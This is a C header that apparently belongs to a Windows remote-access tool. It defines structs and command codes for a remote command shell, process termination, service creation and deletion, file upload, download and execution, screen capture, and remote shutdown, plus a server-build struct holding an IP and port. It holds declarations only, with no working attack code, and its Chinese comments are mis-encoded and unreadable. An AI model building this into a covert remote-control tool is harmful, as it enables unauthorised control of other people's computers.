#pragma once

#define TSIZE 1024*2
struct COMMEND
{
	int ID;
	int fID;
	char teste[TSIZE];
};

#define COMSIZE sizeof(COMMEND)

struct SYSINFO
{
	wchar_t cmpname[40];
	UINT memsize;
	DWORD OS;
};

struct PROCESSINFO
{
	wchar_t pName[30];
	int Pid;
	wchar_t pPath[MAX_PATH];
};

//�����б���Ϣ
struct SVICELISTINFO
{
	wchar_t ServiceName[100];
	wchar_t DisplayName[100];
	wchar_t Description[MAX_PATH];
	DWORD stype;
	DWORD CurrentStatus;
	wchar_t BinPath[MAX_PATH];
};


//������Ϣ
struct DRIVEINFO
{
	wchar_t Drive[5];
	UINT dType;
};

//���ɷ����������Ϣ�ṹ��
struct BUILD{
	wchar_t IP[40];
	UINT port;
};

//�ļ�����������ṹ��
#define FILESIZE  (1024*20)
struct FILESRCMD{
	int ID;
	int fID;
	char teste[FILESIZE];
};
#define FILESRSIZE sizeof(FILESRCMD)

#define MYGETSYSINFO	  0x001
#define MYEXITPROCESS	  0x002
#define MYGETPROCESS	  0x003
#define MYCMDSHELL		  0x004
#define MYSVCMANAGE		  0x005
#define MYFILEMANAGE	  0x006
#define FILESOCKSTART	  0x007  //���ļ�����ר�ö˿�
#define MYSCREENMANAGE	  0x008  //��Ļ���


#define PROCESSLIST	      TSIZE+100 //��ȡ�����б�
#define MODULELIST        TSIZE+101 //��ȡģ���б�
#define EXITPROCESS       TSIZE+102 //��������


#define STARTCMD		    TSIZE+103 //����CMD
#define STARTCMDERROR       TSIZE+104 //����CMDʧ��
#define WRITECMD		    TSIZE+105 //д��CMD����

#define MYLOGOUT		    TSIZE+106 //ע��
#define MYRESTART	        TSIZE+107 //����
#define MYSHUTDOWN		    TSIZE+108 //�ػ�


#define GETSVCLIST			 TSIZE+109 //��ȡ�����б�
#define MYSTARTSVC			 TSIZE+110 //��������
#define SVCMSG				 TSIZE+111 //������Ϣ
#define SVCSTOP		        TSIZE+112 //ֹͣ����
#define SVCAUTOTYPE			 TSIZE+113 //�Զ�����
#define SVCBOOTYPE			 TSIZE+114 //�ֶ�����
#define SVCDISABLETYPE		 TSIZE+115 //��ֹ����
#define SVCDELETE			 TSIZE+116 //����ɾ��
#define SVCCREATE			 TSIZE+117 //���񴴽�


#define FILEDRIVER			 TSIZE+118 //��ȡ�����̷�
#define FILEGET				 TSIZE+119 //��ȡ�ļ����ļ���
#define MYSTARTCHECK		 TSIZE+120 //֪ͨ����˿��Ե��
#define MYRUNFILE   		 TSIZE+121 //�ļ���ִ��
#define MYDELFILE   		 TSIZE+122 //�ļ���ɾ��
#define DELETEDIRIC			 TSIZE+123 //ɾ���ļ���
#define DIRCREATE	        TSIZE+124 //�����ļ���

#define FILEDOWN	        FILESIZE+100  //�ļ�����
#define FILEUP		        FILESIZE+101  //�ļ��ϴ�
#define FILECREATE	        FILESIZE+102  //�ļ���Ϣ
#define FILECANCEL	        FILESIZE+103  //ȡ������

#define STARTSCREEEN		 FILESIZE+104  //������Ļ���
#define STARTSENDPIC		 FILESIZE+105  //������Ļ��ͼ

